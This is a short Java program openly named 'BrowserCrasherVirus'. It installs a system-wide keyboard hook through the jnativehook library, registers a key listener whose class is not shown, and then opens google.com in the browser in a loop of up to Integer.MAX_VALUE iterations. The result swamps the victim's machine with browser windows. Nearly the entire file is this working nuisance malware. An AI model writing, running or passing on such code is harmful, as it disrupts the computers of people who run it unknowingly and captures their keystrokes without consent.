package BrowserCrasherVirus;

import java.awt.Desktop;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

public class BrowserCrasherVirus {
	
	public static int[] code = new int[] {18, 45, 23, 20};
	public static int index = 0;

	public static void main(String[] args) throws NativeHookException {
		// TODO Auto-generated method stub
		GlobalScreen.registerNativeHook();
		GlobalScreen.addNativeKeyListener(new keyListener());
		URL url = null;
		try {
			url = new URL("https://www.google.com");
		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		for (int i = 0; i < Integer.MAX_VALUE; i++)
			openWebpage(url);
	}
	
	public static boolean openWebpage(URI uri) {
	    Desktop desktop = Desktop.isDesktopSupported() ? Desktop.getDesktop() : null;
	    if (desktop != null && desktop.isSupported(Desktop.Action.BROWSE)) {
	        try {
	            desktop.browse(uri);
	            return true;
	        } catch (Exception e) {
	            e.printStackTrace();
	        }
	    }
	    return false;
	}

	public static boolean openWebpage(URL url) {
	    try {
	        return openWebpage(url.toURI());
	    } catch (URISyntaxException e) {
	        e.printStackTrace();
	    }
	    return false;
	}

}
